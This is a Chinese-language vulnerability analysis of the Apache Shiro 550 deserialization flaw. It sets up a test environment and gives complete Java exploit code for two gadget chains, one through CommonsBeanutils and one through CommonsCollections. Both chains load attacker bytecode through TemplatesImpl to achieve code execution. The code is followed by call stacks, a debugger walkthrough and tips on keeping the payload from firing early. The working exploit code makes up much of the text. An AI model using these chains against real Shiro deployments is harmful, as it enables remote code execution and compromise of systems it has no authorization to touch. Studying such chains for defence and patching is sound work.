# 简介

Apache
Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。

利用方式：获取固定编码的Key，构造反序列化结合其它依赖进行攻击。

# 环境搭建

项目地址：<https://github.com/apache/shiro> （版本<=1.2.4）

编辑shiro/samples/web目录下的pom.xml,加一个jstl的版本，否则默认版本解析jsp会报500错误。

    
    
    <dependency>
    <groupId>javax.servlet</groupId>
    <artifactId>jstl</artifactId>
    <version>1.2</version>
    <scope>provided</scope>
    </dependency>
    

导入的依赖

    
    
    <dependency>
        <groupId>commons-beanutils</groupId>
        <artifactId>commons-beanutils</artifactId>
        <version>1.9.2</version>
    </dependency>
    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-collections4</artifactId>
        <version>4.0</version>
    </dependency>
    

# 手写EXP

## 基于CB的

    
    
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import org.apache.commons.beanutils.BeanComparator;
    
    
    import java.io.*;
    import java.lang.reflect.Field;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    import java.util.PriorityQueue;
    
    
    public class CBtest {
        public static void main(String[] args) throws Exception {
            byte[] code = Files.readAllBytes(Paths.get("E:\\JAVA\\shiro550\\target\\classes\\Exp.class"));
            //TemplateImpl类
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_name", "360");
            setFieldValue(templates, "_bytecodes", new byte[][] {code});
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
            //templates.newTransformer();
            //BeanComparator类
            BeanComparator beanComparator = new BeanComparator();
            // 创建新的队列，并添加恶意字节码
            //PriorityQueue类
            PriorityQueue queue = new PriorityQueue(360, beanComparator);
            queue.add(1);
            queue.add(1);
    
            setFieldValue(beanComparator, "property", "outputProperties");
            setFieldValue(queue, "queue", new Object[]{templates, templates});
            serialize(queue);
            unserialize("serCB.bin");
        }
    
        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
            Field field = obj.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, value);
        }
    
        public static void serialize(Object obj) throws IOException {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("serCB.bin"));
            oos.writeObject(obj);
        }
        public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
            Object obj = ois.readObject();
            return obj;
        }
    }
    

## 基于CC的

    
    
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    
    import java.io.*;
    import java.lang.reflect.Field;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    import java.util.HashMap;
    import java.util.Map;
    
    public class CCtest {
        public static void main(String[] args) throws Exception{
            byte[] code = Files.readAllBytes(Paths.get("E:\\JAVA\\shiro550\\target\\classes\\Exp.class"));
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_name", "calc");
            setFieldValue(templates, "_bytecodes", new byte[][] {code});
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
            InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);
    
            HashMap<Object, Object> hashMap = new HashMap<>();
    //        hashMap.put("123", "456");
    //        hashMap.put(templates, "456");
            Map<Object,Object> lazymap = LazyMap.decorate(hashMap, new ConstantTransformer(1));
            TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, templates);
    
            HashMap<Object,Object> map1=new HashMap<>();
            map1.put(tiedMapEntry, "bbb");
            lazymap.remove(templates);
    
            Class c = LazyMap.class;
            Field factory = c.getDeclaredField("factory");
            factory.setAccessible(true);
            factory.set(lazymap, invokerTransformer);
            serialize(map1);
            unserialize("serCC.bin");
        }
        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
            Field field = obj.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, value);
        }
        public static void serialize(Object obj) throws IOException {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("serCC.bin"));
            oos.writeObject(obj);
        }
        public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
            Object obj = ois.readObject();
            return obj;
        }
    }
    

# 调用栈

    
    
    getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:497, Method (java.lang.reflect)
    invokeMethod:2116, PropertyUtilsBean (org.apache.commons.beanutils)
    getSimpleProperty:1267, PropertyUtilsBean (org.apache.commons.beanutils)
    getNestedProperty:808, PropertyUtilsBean (org.apache.commons.beanutils)
    getProperty:884, PropertyUtilsBean (org.apache.commons.beanutils)
    getProperty:464, PropertyUtils (org.apache.commons.beanutils)
    compare:163, BeanComparator (org.apache.commons.beanutils)
    siftDownUsingComparator:721, PriorityQueue (java.util)
    siftDown:687, PriorityQueue (java.util)
    heapify:736, PriorityQueue (java.util)
    readObject:795, PriorityQueue (java.util)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:497, Method (java.lang.reflect)
    invokeReadObject:1058, ObjectStreamClass (java.io)
    readSerialData:1900, ObjectInputStream (java.io)
    readOrdinaryObject:1801, ObjectInputStream (java.io)
    readObject0:1351, ObjectInputStream (java.io)
    readObject:371, ObjectInputStream (java.io)
    unserialize:48, CBtest
    main:33, CBtest
    
    
    
    transform:133, InvokerTransformer (org.apache.commons.collections.functors)
    get:158, LazyMap (org.apache.commons.collections.map)
    getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)
    hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)
    hash:338, HashMap (java.util)
    readObject:1397, HashMap (java.util)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:497, Method (java.lang.reflect)
    invokeReadObject:1058, ObjectStreamClass (java.io)
    readSerialData:1900, ObjectInputStream (java.io)
    readOrdinaryObject:1801, ObjectInputStream (java.io)
    readObject0:1351, ObjectInputStream (java.io)
    readObject:371, ObjectInputStream (java.io)
    unserialize:52, CCtest
    main:39, CCtest
    

# 漏洞分析

## 基于CB的

把断点下在入口处。

![](./img/9182574124809567215.png)

跟进到PriorityQueue类下的readObject方法，再跟进heapify方法。

![](./img/7251618942851141996.png)

进入到siftDown方法。

![](./img/8331292547922468752.png)

此处comparator不为null，所以会走到siftDownUsingComparator方法。

![](./img/8743052360336811604.png)

此时要注意流程会执行comparator.compare方法，也就是会走到
BeanComparator类下的compare方法。而x是我们传入的恶意templates对象。

![](./img/3981331542159900098.png)

BeanComparator的compare方法体中,PropertyUtils.getProperty会执行任意对象的任意getter或setter方法，所以我们传入TemplatesImpl下的getOutputProperties方法。

![](./img/4522701133887993164.png)

流程走到漏洞触发点。

![](./img/2004369205668941340.png)

## 基于CC的

入口处，HashMap类下的readObject方法，会对传进来的任意key调用hash(),hash方法又会对这个key调用hashcode方法。

![](./img/2559634480596662267.png)

![](./img/5476811095534998916.png)

因为我们传入的是TiedMapEntry的对象，所以会执行该类下的hashcode方法，而其方法体内又会调用自身的getValue()。

![](./img/3693688951703101901.png)

我们跟进getValue(),可以发现会调用map.get(key)。map是我们传入的lazyMap,key是我们传入的恶意对象。

![](./img/5754438680472665223.png)

可以看到在LazyMap类下的get方法，会获取map本身的key值与我们传入的key值做比较，如果不同则返回false，流程就可以执行factory.transform(key)。

![](./img/5345833232106713735.png)

我们可以通过反射获取factory属性改为InvokerTransformer对象，流程就会走到InvokerTransformer类下的transform方法，反射调用恶意对象下的newTransformer方法，实现代码执行。

![](./img/3919312215166222021.png)

# 注意点（手写EXP时）

要先给beanComparator和queue正常的值，在queue.add完之后反射修改为恶意值，可以避免恶意对象提前执行。

    
    
    BeanComparator beanComparator = new BeanComparator();    
        PriorityQueue queue = new PriorityQueue(360, beanComparator);   
        queue.add(1);
        queue.add(1);
    
        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});
    

在执行下面这个构造函数时，会将tiedMapEntry的key赋值给lazymap的key，然后流程就不能走进下面的if语句中，所以最后要反射清除key。

    
    
    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, templates);
              lazymap.remove(templates);
    

![](./img/5843194979723847924.png)

# 总结

在debug的时候流程可能不会按照预期那样执行这是因为IDEA可能会自动触发一些函数跑完我们的playload（坑点），当然这也跟断点下的位置有关。

